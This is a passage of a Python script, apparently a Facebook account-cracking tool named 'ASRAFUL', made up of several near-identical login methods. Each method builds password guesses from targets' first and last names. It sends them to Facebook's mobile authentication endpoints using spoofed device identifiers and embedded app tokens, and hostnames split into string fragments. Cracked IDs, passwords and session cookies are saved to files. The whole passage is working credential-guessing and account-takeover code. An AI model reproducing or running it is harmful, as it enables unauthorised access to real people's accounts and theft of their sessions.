                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: WIFI',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://a"+"pi.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://a'+'pi.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers);c.setopt(c.WRITEDATA, buffer);data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()]);c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'));c.perform();c.close();po = buffer.getvalue().decode('utf-8');q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}ASRAFUL{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M2-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M2-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[FILE METHOD 3]▬▭▬▭▬▭▬▭#
def FILE_M_THREE(ids, names, passlist, total_ids):
    global oks,cps,loop
    axf = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{style}{white}»{rad}[{green}ASRAFUL-F3{rad}]{white}»{rad}[{axf}{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = random.choice(get_ua_list3)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62'
            ]
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
            c.setopt(c.HTTPHEADER, headers);c.setopt(c.WRITEDATA, buffer);data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()]);c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'));c.perform();c.close();po = buffer.getvalue().decode('utf-8');q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}ASRAFUL{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M3-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M3-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[FILE METHOD 4]▬▭▬▭▬▭▬▭#
def FILE_M_FOUR(ids, names, passlist, total_ids):
    global oks,cps,loop
    axf = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{style}{white}»{rad}[{green}ASRAFUL-F4{rad}]{white}»{rad}[{axf}{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = random.choice(get_ua_list4)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{secure_family_device_id}",
                "advertiser_id": f"{advertiser_id}",
                "format": "json",
                "cpl": "true",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": ids,
                "password": pas,
                "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",     
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig": "cc331688c9ec07059af4df9dbdcf7737"}
            headers = [
                "Host: graph.facebook.com",
                "Authorization: OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                f"X-FB-Net-HNI: {netheni}",
                f"X-FB-SIM-HNI: {simheni}",
                f"User-Agent: {user_agent.encode('utf-8')}",
                "X-FB-Client-IP: True",
                "X-FB-Request-Analytics-Tags: graphservice",
                "X-Tigon-Is-Retry: False",
                "X-FB-HTTP-Engine: Liger",
                "X-FB-Connection-Quality: EXCELLENT",
                "X-FB-Server-Cluster: True",
                "Connection: keep-alive",
                "x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62",         
                "X-FB-Connection-Bandwidth: 80025933",
                "X-FB-Friendly-Name: ViewerReactionsMutation",
                "Accept-Encoding: gzip, deflate",
                "X-FB-Connection-Type: MOBILE.LTE",
                "Content-Type: application/x-www-form-urlencoded",
            ]
            url = "https://b-gr"+"aph.face"+"book.com/auth/login?incl"+"ude_head"+"ers=false&d"+"ecode_body_json=false&stre"+"amable_json_resp"+"onse=true"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-gr'+'aph.face'+'book.com/aut'+'h/login?include_h'+'eaders=false&de'+'code_body_json=false&str'+'eamable_json_resp'+'onse=true')
            c.setopt(c.HTTPHEADER, headers);c.setopt(c.WRITEDATA, buffer);data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()]);c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'));c.perform();c.close();po = buffer.getvalue().decode('utf-8');q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}ASRAFUL{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M4-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M4-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[FILE METHOD 5]▬▭▬▭▬▭▬▭#
def FILE_M_FIVE(ids, names, passlist, total_ids):
    global oks,cps,loop
    axf = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{style}{white}»{rad}[{green}ASRAFUL-F5{rad}]{white}»{rad}[{axf}{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            metheni = str(random.randint(20000000, 40000000)),
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = random.choice(get_ua_list5)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
            "adid": f"{adid}",
            "device_id": f"{device_id}",
            "family_device_id": f"{family_device_id}",
            "secure_family_device_id": f"{secure_family_device_id}",
            "advertiser_id": f"{advertiser_id}",
            "method": "POST",
            "format": "json",
            "email": ids,
            "password": pas,
            "cpl": "true",
            "credentials_type": "password",
            "generate_session_cookies": "1",
            "error_detail_type": "button_with_disabled",
            "generate_machine_id": "1",
            "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
            "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
            "omit_response_on_success": "false",
            "fb_api_req_friendly_name": "authenticate"}
            headers = [
            "Host: b-graph.facebook.com",
            "Authorization: OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
            f"x-fb-connection-bandwidth: {metheni}",
            f"X-FB-Net-HNI: {netheni}",
            f"X-FB-SIM-HNI: {simheni}",
            f"User-Agent: {user_agent.encode('utf-8')}",
            "x-fb-connection-quality: GOOD",
            "x-fb-connection-type: MOBILE.LTE",
            "content-type: app_authlication/x-www-form-urlencoded",
            "x-fb-http-engine: Liger",
            "x-fb-client-IP: True",
            "x-fb-server-cluster: Keep-Alive",
            "Content-Type: application/json",
            ]
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
            c.setopt(c.HTTPHEADER, headers);c.setopt(c.WRITEDATA, buffer);data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()]);c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'));c.perform();c.close();po = buffer.getvalue().decode('utf-8');q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}ASRAFUL{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M5-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/ASRAFUL-TOOL/ASRAFUL-FILE-M5-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
if __name__=="__main__":
    os.system('clear')
    ASRAFUL_main()
else:
    os.system('clear')
    ASRAFUL_main()